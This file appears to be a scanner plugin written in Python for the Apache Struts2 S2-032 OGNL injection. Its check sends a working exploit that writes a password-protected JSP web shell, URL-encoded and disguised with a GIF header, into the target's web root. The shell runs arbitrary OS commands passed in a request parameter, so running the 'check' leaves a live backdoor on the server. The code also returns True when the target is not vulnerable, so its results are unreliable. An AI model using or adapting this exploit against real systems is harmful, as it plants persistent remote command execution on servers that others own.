#  -*- coding: utf-8 -*-

import random
import requests

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    jsp_file = str(random.randint(1000, 1000000)) + '.jsp'
    content = 'gif89a%3C%25%0A%20%20%20%20if%28%22024%22.equals%28request.' \
              'getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%2' \
              '0%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%' \
              '29.exec%28request.getParameter%28%22l%22%29%29.getInputStre' \
              'am%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B' \
              '%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byt' \
              'e%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3C' \
              'pre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din' \
              '.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20' \
              '%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%2' \
              '0%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%' \
              '22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E'

    poc_url = "{url}?method:%23_memberAccess%3d@ognl.OgnlContext" \
              "@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0]," \
              "%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a)," \
              "%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23" \
              "fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23para" \
              "meters.content[0].getBytes()),%23fos.close(),%23hh%3d%23conte" \
              "xt.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23" \
              "b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23x" \
              "x:%23request.toString&reqobj=com.opensymphony.xwork2.dispatch" \
              "er.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatch" \
              "er.HttpServletResponse&reqobj=%2f&reqobj={filename}&content={" \
              "content}".format(url=url, filename=jsp_file, content=content)

    try:
        s = requests.get(poc_url, timeout=10)
        if s.status_code == 200 and jsp_file in s.content:
            msg = 'There is a struts2 vul , payloadid is S2-032.'
            print(msg)
            return True,url,msg
        else:
            msg = 'There is no struts2 vul'
            return True,url,msg
    except Exception as e:
        msg = str(e)
        return False,url,msg
